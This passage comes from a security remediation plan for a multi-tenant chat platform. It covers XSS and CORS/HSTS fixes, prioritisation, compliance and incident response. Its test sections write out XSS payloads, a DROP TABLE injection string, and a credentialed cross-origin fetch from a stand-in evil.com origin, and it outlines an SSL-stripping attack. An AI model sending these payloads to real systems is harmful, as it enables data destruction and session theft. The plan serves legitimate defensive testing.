   curl -I https://chat.genai.hr/widget.js
   # Expected: Content-Security-Policy: ... style-src 'self' 'nonce-...'
   # (no 'unsafe-inline')

   # Test 2: Attempt inline style injection
   curl https://chat.genai.hr/widget/config/tenant123 | grep "style="
   # Expected: No inline styles, or styles with nonce attribute
   ```

2. **XSS Attack Simulation**:
   ```bash
   # Test 3: Inject XSS payload via widget config
   curl -X PUT https://chat.genai.hr/api/tenants/123 \
     -H "X-API-Key: ..." \
     -d '{
       "brandName": "<script>alert(1)</script>",
       "agentName": "<img src=x onerror=alert(2)>",
       "initialMessage": "Test'; DROP TABLE \"User\"; --"
     }'

   # Test 4: Load widget and inspect DOM
   # Open browser: https://chat.genai.hr/widget.html?tenant=123
   # Inspect DOM for XSS execution
   # Expected: Scripts/tags escaped or stripped
   ```

3. **DOMPurify Sanitization**:
   ```typescript
   // test/sanitize.test.ts
   import { sanitizeHtml, sanitizeRichText } from '../utils/sanitize';

   describe('sanitizeHtml', () => {
     it('strips all HTML tags', () => {
       expect(sanitizeHtml('<script>alert(1)</script>Hello'))
         .toBe('Hello');
     });

     it('escapes special characters', () => {
       expect(sanitizeHtml('Test & <test>'))
         .toBe('Test &amp; test');
     });
   });

   describe('sanitizeRichText', () => {
     it('allows safe tags', () => {
       expect(sanitizeRichText('Hello <b>world</b>'))
         .toBe('Hello <b>world</b>');
     });

     it('strips dangerous tags', () => {
       expect(sanitizeRichText('Hello <script>alert(1)</script>'))
         .toBe('Hello ');
     });
   });
   ```

4. **ESLint Prevention**:
   ```bash
   # Test 5: Verify ESLint catches dangerouslySetInnerHTML
   cat > test-file.tsx <<EOF
   export const BadComponent = () => (
     <div dangerouslySetInnerHTML={{ __html: userInput }} />
   );
   EOF

   npm run lint
   # Expected: Error - react/no-danger - Do not use dangerouslySetInnerHTML
   ```

5. **Browser Security Testing**:
   ```bash
   # Test 6: Use browser XSS scanner
   # Install: npm install -g xss-scanner
   xss-scanner https://chat.genai.hr/widget.html?tenant=123
   # Expected: No XSS vulnerabilities detected
   ```

**Phase 4 Validation Checklist:**
- [ ] Deploy hardened CSP with nonce support
- [ ] Verify no `unsafe-inline` in production CSP header
- [ ] Install DOMPurify and sanitize widget config outputs
- [ ] Add input validation for brandName/agentName/initialMessage
- [ ] Configure ESLint to block `dangerouslySetInnerHTML`
- [ ] Test XSS payloads (script tags, event handlers, data URIs)
- [ ] Inspect widget DOM for escaped/stripped malicious content
- [ ] Run automated XSS scanner against widget URL
- [ ] Document sanitization patterns for developers

---

## Issue #5: Missing Security Headers [PR #52]

### Problem Statement
Production API responses lack critical security headers:
1. **No HSTS Header**: Strict-Transport-Security not set, allowing downgrade attacks
2. **Wildcard CORS Risk**: CORS configuration doesn't explicitly reject wildcard origins (`*`)

These gaps weaken transport security and expose the platform to man-in-the-middle (MITM) attacks and cross-origin abuse.

### CVSS Score
**5.3 (Medium)** - CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L
- Attack Vector: Adjacent Network (e.g., public WiFi)
- Attack Complexity: High (requires MITM position + victim interaction)
- Privileges Required: None
- User Interaction: Required (victim must access HTTP version)
- Scope: Unchanged (limited to transport layer)
- Confidentiality Impact: Low (session hijacking possible)
- Integrity Impact: Low (request tampering)
- Availability Impact: Low (denial unlikely)

### Affected Components
- `/home/deploy/meta-chat-platform/apps/api/src/middleware/securityHeaders.ts` (1 addition)
- `/home/deploy/meta-chat-platform/apps/api/src/server.ts` (11 additions, 2 deletions)

**Total Impact:** 2 files, 12 additions, 2 deletions

### Exploitation Scenario

**Vulnerability 5.1: Missing HSTS Header**
```http
// Current Response (VULNERABLE)
HTTP/1.1 200 OK
Content-Type: application/json
// No Strict-Transport-Security header!
```

**Attack Flow:**
1. Victim connects to public WiFi at coffee shop
2. Attacker performs SSL stripping via MITM proxy (e.g., `sslstrip`)
3. Victim types `chat.genai.hr` (no HTTPS prefix)
4. Browser sends HTTP request (unencrypted)
5. Attacker intercepts and modifies response
6. Victim's session cookie stolen in plaintext

**HSTS Prevention:**
```http
// With HSTS (SECURE)
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
// Browser: "Always use HTTPS for chat.genai.hr (for 2 years)"
```

**Vulnerability 5.2: Wildcard CORS Acceptance**
```typescript
// server.ts - Lines 67-76 (BEFORE FIX)
const allowedOrigins = origins
  ? origins.split(',').map((origin) => origin.trim()).filter(Boolean)
  : defaultOrigins;

// If .env contains: ALLOWED_ORIGINS=*
// No validation! Accepts wildcard.
```

**Attack Scenario:**
```bash
# Attacker sets ALLOWED_ORIGINS=* in .env (via config injection)
export ALLOWED_ORIGINS="*"

# Malicious site makes authenticated request
fetch('https://chat.genai.hr/api/conversations', {
  credentials: 'include', // Send cookies
  headers: { 'Origin': 'https://evil.com' }
});

// Response: Access-Control-Allow-Origin: *
// Browser allows cross-origin request with credentials!
```

### Root Cause
1. **Missing HSTS**: `securityHeaders.ts` applies CSP but not HSTS in production
2. **No Wildcard Validation**: CORS parser accepts `*` without rejection
3. **Silent Failure**: Invalid CORS config doesn't throw errors, only logs

### Proposed Solution (from PR #52)

**Fix Applied:**

1. **Add HSTS Header** (production-only):
   ```typescript
   // securityHeaders.ts - Line 26 (ADDED)
   if (process.env.NODE_ENV === 'production') {
     res.setHeader(
       'Strict-Transport-Security',
       'max-age=63072000; includeSubDomains; preload'
     );
     // max-age=63072000 = 2 years
     // includeSubDomains = Apply to all subdomains
     // preload = Submit to HSTS preload list
   }
   ```

2. **Reject Wildcard CORS**:
   ```typescript
   // server.ts - Lines 77-81 (ADDED)
   if (allowedOrigins.includes('*')) {
     const error = new Error('Wildcard CORS origins (*) are not allowed');
     logger.error('Invalid CORS configuration', { origins: allowedOrigins });
     throw error; // Fail fast on startup
   }
   ```

3. **Improved Code Formatting**:
   ```typescript
   // server.ts - Lines 70-76 (FORMATTED)
   const allowedOrigins = origins
     ? origins
         .split(',')
         .map((origin) => origin.trim())
         .filter(Boolean)
     : defaultOrigins;
   ```

### Dependencies
- **Blocks:** None (independent security hardening)
- **Blocked By:** None (can be deployed immediately)
- **Related:** PR #54 (XSS Audit) - Both improve HTTP security posture

### Effort Estimate
**0.5 days** (Quick win - already implemented in PR)
- Code Review: 15 minutes
- Testing: 15 minutes (verify HSTS header, test CORS rejection)
- Deployment: 15 minutes

### Validation Notes - **REQUIRES VPS-00 TESTING (Phase 4)**

**Test Scenarios:**

1. **HSTS Verification**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00

   # Test 1: Verify HSTS header in production
   curl -I https://chat.genai.hr/api/health
   # Expected: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

   # Test 2: Verify HSTS NOT set in development
   export NODE_ENV=development
   npm run dev
   curl -I http://localhost:3000/api/health
   # Expected: No Strict-Transport-Security header
   ```

2. **CORS Wildcard Rejection**:
   ```bash
   # Test 3: Start server with wildcard CORS (should fail)
   export ALLOWED_ORIGINS="*"
   npm start
   # Expected: Server startup fails with error:
   # "Wildcard CORS origins (*) are not allowed"
   # Log entry: { origins: ['*'] }

   # Test 4: Start with valid origins (should succeed)
   export ALLOWED_ORIGINS="https://example.com,https://app.example.com"
   npm start
   # Expected: Server starts successfully
   ```

3. **CORS Behavior**:
   ```bash
   # Test 5: Valid origin (should accept)
   curl -H "Origin: https://example.com" \
        https://chat.genai.hr/api/health
   # Expected: Access-Control-Allow-Origin: https://example.com

   # Test 6: Invalid origin (should reject)
   curl -H "Origin: https://evil.com" \
        https://chat.genai.hr/api/health
   # Expected: No Access-Control-Allow-Origin header
   ```

4. **HSTS Preload Submission**:
   ```bash
   # Test 7: Verify HSTS configuration
   # Visit: https://hstspreload.org/?domain=chat.genai.hr
   # Expected: Eligible for HSTS preload list

   # Criteria:
   # ✓ Serve valid HTTPS certificate
   # ✓ Redirect HTTP to HTTPS (same host)
   # ✓ HSTS header on HTTPS response
   # ✓ max-age >= 31536000 (1 year)
   # ✓ includeSubDomains directive
   # ✓ preload directive
   ```

5. **SSL Stripping Prevention**:
   ```bash
   # Test 8: Simulate SSL strip attack (before HSTS)
   # Use mitmproxy or sslstrip to intercept HTTP traffic
   # After HSTS deployed, browser should refuse HTTP connections

   # Test browser behavior:
   # 1. Visit https://chat.genai.hr (establishes HSTS)
   # 2. Clear browser cache (but not HSTS cache)
   # 3. Type "chat.genai.hr" in address bar (no protocol)
   # Expected: Browser automatically upgrades to HTTPS
   ```

**Phase 4 Validation Checklist:**
- [ ] Deploy PR #52 to VPS-00 production
- [ ] Verify HSTS header present in HTTPS responses
- [ ] Verify HSTS header absent in development
- [ ] Test server startup with `ALLOWED_ORIGINS=*` (should fail)
- [ ] Test CORS with valid/invalid origins
- [ ] Submit domain to HSTS preload list
- [ ] Test browser HSTS behavior (auto-upgrade to HTTPS)
- [ ] Monitor logs for CORS rejection attempts

---

## Priority Matrix

### Risk vs. Effort Visualization

```
High Risk │ #56 Tenant Isolation    #53 Auth Bugs
          │ (2-3 days)              (2 days)
          │
          │ #55 SQL Injection
          │ (1 day)
          │
Medium    │                          #54 XSS Audit
Risk      │                          (1.5 days)
          │
          │ #52 Security Headers
          │ (0.5 days)
Low Risk  │
          └─────────────────────────────────────
            Low Effort              High Effort
```

### Prioritization Criteria

| Priority | Issue | Data Loss Risk | Unauthorized Access Risk | Compliance Impact | Ease of Exploitation | Total Score |
|----------|-------|----------------|--------------------------|-------------------|---------------------|-------------|
| **P0** | PR #56 | 10/10 | 10/10 | 10/10 | 8/10 | **38/40** |
| **P1** | PR #53 | 7/10 | 9/10 | 8/10 | 7/10 | **31/40** |
| **P1** | PR #55 | 8/10 | 7/10 | 7/10 | 4/10 | **26/40** |
| **P2** | PR #54 | 4/10 | 5/10 | 5/10 | 3/10 | **17/40** |
| **P2** | PR #52 | 3/10 | 4/10 | 4/10 | 5/10 | **16/40** |

**Scoring System:**
- **Data Loss Risk**: Potential for data deletion/corruption
- **Unauthorized Access Risk**: Ability to bypass authentication/authorization
- **Compliance Impact**: GDPR/HIPAA/SOC2 violations
- **Ease of Exploitation**: Likelihood of successful attack

---

## Remediation Plan

### Phase 1: Emergency Fixes (Week 1 - Days 1-3)

**Objective:** Address P0 blocker and quick wins

#### Day 1: Security Headers (PR #52)
- **Duration:** 4 hours
- **Owner:** DevOps/Backend Team
- **Tasks:**
  1. Review PR #52 code changes (15 min)
  2. Deploy to staging environment (30 min)
  3. Test HSTS header presence (15 min)
  4. Test CORS wildcard rejection (15 min)
  5. Deploy to production (30 min)
  6. Monitor for CORS errors (2 hours)
- **Success Criteria:**
  - HSTS header present in all production HTTPS responses
  - Server rejects startup if `ALLOWED_ORIGINS=*`
  - No CORS-related errors in production logs

#### Days 2-3: Tenant Isolation (PR #56)
- **Duration:** 2 days
- **Owner:** Backend Team (Lead + 2 Engineers)
- **Tasks:**
  1. **Code Review** (4 hours):
     - Review all 5 file changes
     - Verify `requireTenant()` usage across routes
     - Check `withTenantScope()` implementation
  2. **Unit Testing** (4 hours):
     - Test `requireTenant()` throws on missing tenant
     - Test `withTenantScope()` adds tenant filter
     - Mock scenarios for all affected routes
  3. **Integration Testing** (8 hours):
     - Create 3 test tenants with distinct data
     - Attempt cross-tenant access (should fail)
     - Verify database queries include tenantId filter
  4. **Deployment** (2 hours):
     - Deploy to staging
     - Run smoke tests
     - Deploy to production (off-hours)
  5. **Monitoring** (2 hours):
     - Watch for 401/404 errors
     - Verify no legitimate requests blocked
- **Success Criteria:**
  - All routes enforce tenant authentication
  - Cross-tenant access attempts return 401/404
  - Database queries include `tenantId IN (...)` filter
  - No regression in legitimate tenant operations

**Week 1 Deliverables:**
- PR #52 deployed to production
- PR #56 deployed to production
- Security headers hardened
- Multi-tenant isolation enforced

---

### Phase 2: Authentication Hardening (Week 2 - Days 1-3)

**Objective:** Fix authentication vulnerabilities (PR #53)

#### Day 1: API Key Hashing Fix
- **Duration:** 1 day
- **Owner:** Backend Team
- **Tasks:**
  1. **Code Changes** (4 hours):
     - Replace SHA-256 with `hashSecret()` in `authService.ts`
     - Update `TenantProvisioning.ts` key generation
  2. **Database Migration** (2 hours):
     ```sql
     -- Re-hash existing keys
     UPDATE "TenantApiKey"
     SET "secretHash" = scrypt_hash("secretHash")
     WHERE LENGTH("secretHash") = 64; -- SHA-256 hashes
     ```
  3. **Testing** (2 hours):
     - Create new tenant via signup
     - Verify API key authenticates immediately
     - Check hash length in database (should be 64 bytes)
- **Success Criteria:**
  - New tenants receive functional API keys
  - Existing keys re-hashed with scrypt
  - Authentication success rate = 100%

#### Day 2: WebSocket HMAC Replay Prevention
- **Duration:** 1 day
- **Owner:** Backend Team
- **Tasks:**
  1. **Code Changes** (4 hours):
     - Add timestamp validation (5-minute window)
     - Implement nonce tracking (Redis/in-memory)
  2. **Testing** (4 hours):
     - Test replay with old timestamp (should fail)
     - Test replay with duplicate nonce (should fail)
     - Test legitimate connections (should succeed)
- **Success Criteria:**
  - HMAC signatures expire after 5 minutes
  - Duplicate nonces rejected
  - No impact on legitimate widget connections

#### Day 3: JWT Hardening
- **Duration:** 1 day
- **Owner:** Backend Team
- **Tasks:**
  1. **Code Changes** (4 hours):
     - Add issuer/audience claims to JWT generation
     - Enforce claims in `jwt.verify()`
  2. **Widget Update** (2 hours):
     - Regenerate all widget tokens with claims
     - Update widget loader to handle new tokens
  3. **Testing** (2 hours):
     - Test widget authentication
     - Attempt algorithm confusion attack (should fail)
- **Success Criteria:**
  - JWTs include `iss`, `aud`, `exp` claims
  - Algorithm confusion attacks rejected
  - Widget connections stable

**Week 2 Deliverables:**
- Functional API keys for all tenants
- HMAC replay prevention active
- Hardened JWT configuration

---

### Phase 3: Data Integrity & Input Validation (Week 2 - Days 4-5)

**Objective:** Fix SQL injection and XSS risks (PR #55, #54)

#### Day 4: SQL Injection Remediation (PR #55)
- **Duration:** 1 day
- **Owner:** Database Team
- **Tasks:**
  1. **Audit Raw SQL** (2 hours):
     - `grep -rn "\$executeRawUnsafe" .`
     - Review each instance
  2. **Refactoring** (4 hours):
     - Migrate `maintenance.ts` to `Prisma.sql`
     - Add whitelist validation for table names
  3. **Testing** (2 hours):
     - Test with valid table names (should succeed)
     - Test with SQL injection payloads (should reject)
- **Success Criteria:**
  - No remaining `$executeRawUnsafe` calls
  - Table name whitelist enforced
  - SQL injection tests blocked

#### Day 5: XSS Hardening (PR #54)
- **Duration:** 1 day
- **Owner:** Frontend Team
- **Tasks:**
  1. **CSP Nonce** (4 hours):
     - Generate CSP nonce per request
     - Update widget to use nonce for inline styles
  2. **Sanitization** (2 hours):
     - Install DOMPurify
     - Sanitize widget config outputs
  3. **Input Validation** (2 hours):
     - Add Zod schemas for brandName/agentName
     - Configure ESLint rule for `dangerouslySetInnerHTML`
- **Success Criteria:**
  - CSP header excludes `unsafe-inline`
  - XSS payloads stripped/escaped
  - ESLint blocks dangerous patterns

**Week 2 Deliverables:**
- SQL injection vectors eliminated
- XSS defenses strengthened
- Input validation enforced

---

### Phase 4: VPS-00 Validation & Monitoring (Week 3)

**Objective:** Comprehensive security testing on production environment

#### Day 1-2: Security Testing
- **Duration:** 2 days
- **Owner:** QA/Security Team
- **Tasks:**
  1. **Tenant Isolation Tests**:
     - Create multi-tenant test scenarios
     - Attempt cross-tenant data access
     - Verify database query scoping
  2. **Authentication Tests**:
     - Test API key authentication
     - Test HMAC replay prevention
     - Test JWT validation
  3. **Injection Tests**:
     - SQL injection payloads
     - XSS attack vectors
     - CORS bypass attempts
  4. **Security Headers**:
     - Verify HSTS on all HTTPS responses
     - Check CSP configuration
     - Test SSL/TLS enforcement

#### Day 3: Monitoring & Documentation
- **Duration:** 1 day
- **Owner:** DevOps Team
- **Tasks:**
  1. **Logging**:
     - Enable audit logging for security events
     - Configure alerts for anomalies
  2. **Documentation**:
     - Update security documentation
     - Create runbooks for incident response
  3. **Training**:
     - Brief team on security fixes
     - Review secure coding practices

**Week 3 Deliverables:**
- All PRs validated on VPS-00
- Security monitoring enabled
- Team trained on security practices

---

## Quick Wins vs. Long-Term Fixes

### Quick Wins (< 1 Day Effort)

**Immediate Impact, Low Effort:**

1. **PR #52: Security Headers** (0.5 days)
   - **Impact:** Prevents HTTPS downgrade attacks
   - **Effort:** 4 hours (already implemented)
   - **Deploy:** Day 1 of Week 1
   - **Risk:** Very low (additive change)

2. **CORS Wildcard Rejection** (0.5 days)
   - **Impact:** Prevents cross-origin abuse
   - **Effort:** Already in PR #52
   - **Deploy:** Day 1 of Week 1
   - **Risk:** Very low (startup validation)

3. **ESLint XSS Prevention** (0.25 days)
   - **Impact:** Prevents future XSS introduction
   - **Effort:** 2 hours (config change)
   - **Deploy:** Week 2, Day 5
   - **Risk:** None (linting only)

**Total Quick Wins:** 1.25 days, deployable in Week 1-2

---

### Long-Term Fixes (2-3 Days Effort)

**High Impact, Requires Careful Planning:**

1. **PR #56: Tenant Isolation** (2-3 days)
   - **Impact:** Prevents catastrophic data breach
   - **Effort:** 2 days (code) + 0.5 days (testing)
   - **Deploy:** Week 1, Days 2-3
   - **Risk:** High (affects all API routes)
   - **Mitigation:** Comprehensive testing, staged rollout

2. **PR #53: Authentication Fixes** (2 days)
   - **Impact:** Restores API key functionality, prevents replay
   - **Effort:** 3 separate fixes (0.5 days each) + 0.5 days integration
   - **Deploy:** Week 2, Days 1-3
   - **Risk:** Medium (authentication changes)
   - **Mitigation:** Backward compatibility, gradual rollout

3. **PR #55: SQL Injection** (1 day)
   - **Impact:** Eliminates injection vectors
   - **Effort:** 0.5 days (refactor) + 0.5 days (testing)
   - **Deploy:** Week 2, Day 4
   - **Risk:** Medium (database layer changes)
   - **Mitigation:** Whitelist validation, thorough testing

4. **PR #54: XSS Hardening** (1.5 days)
   - **Impact:** Defense-in-depth against XSS
   - **Effort:** 1 day (implementation) + 0.5 days (testing)
   - **Deploy:** Week 2, Day 5
   - **Risk:** Low (frontend changes)
   - **Mitigation:** CSP nonce testing, sanitization validation

**Total Long-Term Fixes:** 6.5-7.5 days, spread over 2 weeks

---

## VPS-00 Validation Summary

### Critical Tests Requiring Production Environment

| Test Category | PR | Duration | Phase 4 Priority |
|---------------|-----|----------|------------------|
| Multi-Tenant Isolation | #56 | 4 hours | **CRITICAL** |
| API Key Authentication | #53 | 2 hours | **HIGH** |
| HMAC Replay Prevention | #53 | 2 hours | **HIGH** |
| SQL Injection Attempts | #55 | 2 hours | **MEDIUM** |
| XSS Attack Vectors | #54 | 2 hours | **MEDIUM** |
| HSTS/CORS Validation | #52 | 1 hour | **LOW** |

**Total Phase 4 Testing:** 13 hours (2 days)

### Testing Environment Setup

**Prerequisites:**
```bash
# On VPS-00
ssh admin@VPS-00

# 1. Prepare test tenants
cd /home/deploy/meta-chat-platform
npm run seed:test-tenants

# 2. Enable query logging
docker exec -it postgres psql -U metachat -d metachat_production \
  -c "ALTER DATABASE metachat_production SET log_statement = 'all';"

# 3. Enable audit logging
export ENABLE_AUDIT_LOG=true
npm run restart

# 4. Install security testing tools
npm install -g wscat jwt-cli
```

### Validation Report Template

**For each PR, document:**
- [ ] Test scenarios executed
- [ ] Attack payloads tested
- [ ] Database queries inspected
- [ ] Log entries verified
- [ ] Performance impact measured
- [ ] Regression tests passed
- [ ] Sign-off by Security Team

---

## Compliance Impact

### GDPR Implications

**PR #56 (Tenant Isolation) - CRITICAL:**
- **Article 32 (Security of Processing)**: Multi-tenant data leakage violates requirement for appropriate technical measures
- **Article 33 (Breach Notification)**: Cross-tenant access constitutes data breach requiring 72-hour notification
- **Penalty Risk:** Up to €20 million or 4% of annual global turnover
- **Remediation Urgency:** Immediate (within 24-72 hours of discovery)

**PR #53 (Authentication) - HIGH:**
- **Article 5(1)(f) (Integrity and Confidentiality)**: Weak authentication undermines data security
- **Article 32**: Missing replay prevention fails appropriate security standard
- **Penalty Risk:** Medium (up to €10 million or 2% of turnover)

**PR #55 (SQL Injection) - MEDIUM:**
- **Article 32**: Injection vulnerabilities constitute inadequate security
- **Article 25 (Data Protection by Design)**: Should have prevented at design stage
- **Penalty Risk:** Low-Medium (if no breach occurs)

### SOC 2 Compliance

**Affected Controls:**

| PR | SOC 2 Trust Service | Control Impact |
|----|---------------------|----------------|
| #56 | CC6.1 (Logical Access) | **CRITICAL** - Tenant isolation failure |
| #53 | CC6.1, CC6.2 (Authentication) | **HIGH** - Weak auth mechanisms |
| #55 | CC7.2 (System Monitoring) | **MEDIUM** - Injection detection gaps |
| #54 | CC6.6 (Data Protection) | **MEDIUM** - XSS defense weaknesses |
| #52 | CC6.7 (Transmission Security) | **MEDIUM** - Missing HSTS |

**Audit Findings:**
- **PR #56**: Material weakness (would fail SOC 2 audit)
- **PR #53**: Significant deficiency (requires management response)
- **PR #55, #54, #52**: Control deficiencies (requires remediation plan)

### HIPAA Considerations (if handling PHI)

**Relevant Safeguards:**

| PR | HIPAA Safeguard | Impact |
|----|-----------------|--------|
| #56 | §164.312(a)(1) - Access Control | **CRITICAL** |
| #53 | §164.312(d) - Person/Entity Authentication | **HIGH** |
| #55 | §164.312(b) - Audit Controls | **MEDIUM** |
| #52 | §164.312(e)(1) - Transmission Security | **MEDIUM** |

**Breach Notification Trigger:**
- PR #56 exploitation → **Mandatory breach notification** (affects 500+ individuals)

---

## Incident Response Runbook

### If Exploitation Detected

**Immediate Actions (0-1 hour):**
1. **Isolate Affected Systems**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00

   # Block suspicious IPs
   iptables -A INPUT -s <attacker-ip> -j DROP

   # Disable affected API routes
   export MAINTENANCE_MODE=true
   systemctl restart meta-chat-api
   ```

2. **Preserve Evidence**:
   ```bash
   # Capture logs
   docker logs meta-chat-api > /var/log/incident-$(date +%s).log

   # Database snapshot
   pg_dump metachat_production > /backup/incident-snapshot-$(date +%s).sql
   ```

3. **Notify Stakeholders**:
   - Security Team: immediate@example.com
   - Legal/Compliance: legal@example.com
   - Affected Tenants: (within 72 hours for GDPR)

**Investigation Phase (1-4 hours):**
1. **Identify Scope**:
   ```sql
   -- Check for cross-tenant access
   SELECT
     "tenantId",
     COUNT(DISTINCT "userId") as affected_users,
     MIN("createdAt") as first_breach,
     MAX("createdAt") as last_breach
   FROM "AuditLog"
   WHERE "action" = 'UNAUTHORIZED_ACCESS'
     AND "timestamp" > NOW() - INTERVAL '7 days'
   GROUP BY "tenantId";
   ```

2. **Assess Impact**:
   - Number of affected tenants
   - Types of data accessed
   - Timeframe of breach
   - Attack attribution

**Remediation Phase (4-24 hours):**
1. **Deploy Emergency Fix**:
   - Deploy PR #56 immediately (skip normal QA if necessary)
   - Invalidate all API keys
   - Force tenant re-authentication

2. **Data Integrity Verification**:
   - Run PR #68 data integrity queries
   - Identify compromised records
   - Restore from clean backup if necessary

**Recovery Phase (24-72 hours):**
1. **Restore Service**:
   - Re-enable API routes
   - Monitor for anomalies
   - Validate tenant isolation

2. **Post-Incident Analysis**:
   - Root cause analysis
   - Lessons learned
   - Security posture improvements

---

## Success Metrics

### Key Performance Indicators (KPIs)

**Security Posture:**
- **Target:** 0 critical vulnerabilities by end of Week 2
- **Baseline:** 5 critical vulnerabilities (current state)
- **Measurement:** Weekly vulnerability scan

**Authentication Success Rate:**
- **Target:** 100% API key authentication success
- **Baseline:** ~0% (broken hashing)
- **Measurement:** API auth metrics dashboard

**Multi-Tenant Isolation:**
- **Target:** 0 cross-tenant access attempts succeed
- **Baseline:** Unknown (no enforcement)
- **Measurement:** Audit log analysis

**HSTS Coverage:**
- **Target:** 100% HTTPS responses include HSTS
- **Baseline:** 0%
- **Measurement:** HTTP header analysis

### Risk Reduction Metrics

| Week | Critical Issues | High Issues | Medium Issues | Risk Score |
|------|----------------|-------------|---------------|------------|
| Week 0 (Baseline) | 5 | 0 | 0 | **38/40** |
| Week 1 (Phase 1) | 3 | 2 | 0 | **24/40** (-37%) |
| Week 2 (Phases 2-3) | 0 | 0 | 2 | **8/40** (-79%) |
| Week 3 (Phase 4) | 0 | 0 | 0 | **0/40** (-100%) |

---

## Appendix A: CVSS Scoring Details

### PR #56: Tenant Isolation
**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.8**

- **AV:N** - Attack Vector: Network (remotely exploitable via API)
- **AC:L** - Attack Complexity: Low (no special conditions required)
- **PR:L** - Privileges Required: Low (any authenticated tenant)
- **UI:N** - User Interaction: None
- **S:C** - Scope: Changed (affects other tenants' security context)
- **C:H** - Confidentiality Impact: High (full data exposure)
- **I:H** - Integrity Impact: High (data modification possible)
- **A:H** - Availability Impact: High (data deletion possible)

### PR #53: Authentication
**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L = 8.5**

- **AV:N** - Network (HMAC replay via internet)
- **AC:L** - Low (signature capture straightforward)
- **PR:N** - None (replay doesn't require credentials)
- **UI:N** - None
- **S:C** - Changed (affects tenant boundary)
- **C:H** - High (persistent session access)
- **I:L** - Low (limited to replayed user's permissions)
- **A:L** - Low (DoS unlikely)

### PR #55: SQL Injection
**CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N = 7.8**

- **AV:N** - Network (if maintenance API exposed)
- **AC:H** - High (requires admin access + input control)
- **PR:L** - Low (admin/maintenance role)
- **UI:N** - None
- **S:C** - Changed (database-wide scope)
- **C:H** - High (UNION injection possible)
- **I:H** - High (UPDATE/DELETE possible)
- **A:N** - None (DoS unlikely)

### PR #54: XSS
**CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L = 6.5**

- **AV:N** - Network
- **AC:L** - Low (if dangerouslySetInnerHTML added)
- **PR:L** - Low (tenant admin for widget config)
- **UI:R** - Required (victim must load widget)
- **S:C** - Changed (affects widget users)
- **C:L** - Low (session token theft)
- **I:L** - Low (message tampering)
- **A:L** - Low (widget disruption)

### PR #52: Security Headers
**CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L = 5.3**

- **AV:A** - Adjacent Network (MITM on WiFi)
- **AC:H** - High (requires MITM position)
- **PR:N** - None
- **UI:R** - Required (victim HTTP access)
- **S:U** - Unchanged (transport layer only)
- **C:L** - Low (session hijacking)
- **I:L** - Low (request tampering)
- **A:L** - Low

---

## Appendix B: Attack Techniques Reference

### OWASP Top 10 Mapping

| PR | OWASP 2021 Category | Risk Level |
|----|---------------------|------------|
| #56 | A01: Broken Access Control | **CRITICAL** |
| #53 | A07: Identification and Authentication Failures | **HIGH** |
| #55 | A03: Injection | **HIGH** |
| #54 | A03: Injection (XSS) | **MEDIUM** |
| #52 | A05: Security Misconfiguration | **MEDIUM** |

### CWE Mapping

| PR | CWE ID | CWE Name |
|----|--------|----------|
| #56 | CWE-639 | Authorization Bypass Through User-Controlled Key |
| #53.1 | CWE-328 | Use of Weak Hash |
| #53.2 | CWE-294 | Authentication Bypass by Capture-replay |
| #55 | CWE-89 | SQL Injection |
| #54 | CWE-79 | Cross-site Scripting (XSS) |
| #52 | CWE-523 | Unprotected Transport of Credentials |

---

## Document Metadata

| Field | Value |
|-------|-------|
| **Created** | 2025-11-20 |
| **Last Updated** | 2025-11-20 |
| **Platform** | Meta Chat Platform (chat.genai.hr) |
| **Environment** | VPS-00 Production |
| **Total Issues** | 5 Critical Security Vulnerabilities |
| **Total PRs Analyzed** | 5 (PRs #52-56) |
| **Estimated Remediation Time** | 7.5 days (1.5 weeks) |
| **Phase 4 Validation** | Required for all issues |
| **Next Review Date** | Post-Phase 4 (Week 3) |
| **Document Version** | 1.0 |

---

**END OF SECURITY ISSUES ANALYSIS**
